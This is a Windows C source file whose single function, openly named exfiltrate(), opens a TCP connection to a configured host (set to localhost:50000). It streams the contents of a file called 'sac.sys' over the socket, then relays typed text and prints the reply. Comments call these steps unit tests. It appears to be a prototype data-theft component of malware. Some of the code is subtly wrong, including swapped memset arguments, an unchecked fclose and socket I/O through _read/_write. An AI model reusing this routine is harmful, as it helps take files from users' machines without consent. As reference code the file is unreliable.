#define __STDC_WANT_LIB_EXT1__ 1

#include <io.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define HOST_NAME "localhost"
#define PORT_NUMBER "50000"
#define FILE_NAME "sac.sys"
#define BUFFER_SIZE 512

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")

void exfiltrate()
{
	//----------------------------------------------
	// declare variables

	WSADATA wsaData;
	int wsa_rtn;
	struct addrinfo hints, *res;
	int stat;

	int sockfd;
	//struct sockaddr_in srv_addr;
	//struct hostent *cmdserver;
	//DWORD err;
	FILE *fd;
	errno_t error;

	//buffer to read
	char buffer[BUFFER_SIZE];

	//----------------------------------------------
	// initialization

	wsa_rtn = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (wsa_rtn != 0)
	{
		printf("WSAStartup failure: %d (No usable Winsock DLL)\n", wsa_rtn);
		// do alt action or exit
		exit(-1);
	}

	//port = PORT_NUMBER;


	// await for updates to GetAddrInfoW()
	//cmdserver = gethostbyname(HOST_NAME);



	// Setup the hints address info structure
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET; // IPv4
	hints.ai_socktype = SOCK_STREAM; // TCP-based
	hints.ai_protocol = IPPROTO_TCP;

	if ((stat = getaddrinfo(HOST_NAME, PORT_NUMBER, &hints, &res)) != 0)
	{
		printf("getaddrinfo failed: %s\n", gai_strerror(stat));
		WSACleanup();
		// do alt action or exit
		exit(-1);
	}


	sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);

	if (sockfd < 0)
		printf("Failed to init socket file descriptor");

	/*
	if (cmdserver == NULL)
	{
		err = WSAGetLastError();
		if (err != 0)
			printf("gethostbyname error: %ld\n", err);
		// do alt action or exit
	}

	memset((char *)&srv_addr, 0, sizeof(srv_addr));
	srv_addr.sin_family = AF_INET;
	memcpy((char *)&srv_addr.sin_addr.s_addr, (char *)cmdserver -> h_addr, cmdserver -> h_length);
	srv_addr.sin_port = htons(port);
	*/
	if (connect(sockfd, res->ai_addr, res->ai_addrlen) != 0)
	{
		printf("connection failed");
		// do alt action or exit
		exit(-1);
	}
	/*
	if (connect(sockfd, (struct sockaddr *) &srv_addr, sizeof(srv_addr)) < 0)
	{
		printf("connection failed");
		// do alt action or exit
		exit(-1);
	}
	*/

	//----------------------------------------------
	// unit test: send file
	error = fopen_s(&fd, FILE_NAME, "r+");
	int bytes_read;
	if (error != 0)
	{
		printf("error opening file");
		// do alt action or exit
	}
	else
	{
		while (!feof(fd))
		{
			if ((bytes_read = fread(&buffer, 1, BUFFER_SIZE, fd)) > 0)
				send(sockfd, buffer, bytes_read, 0);
			else
				break;
		}
	}
	fclose(fd);

	//----------------------------------------------
	// unit test: send text
	printf("Text: ");
	memset(buffer, sizeof(buffer), 512);
	fgets(buffer, 511, stdin);
	if (_write(sockfd, buffer, strlen(buffer)) < 0)
		printf("write socket failure");

	//----------------------------------------------
	// unit test: read text
	memset(buffer, 0, 512);
	if (_read(sockfd, buffer, 511) < 0)
		printf("read socket failure");
	printf("%s\n", buffer);

	//----------------------------------------------
	// close up
	_close(sockfd);
	freeaddrinfo(res);
}

int main(int argc, char *argv[])
{
	exfiltrate();
	return 0;
}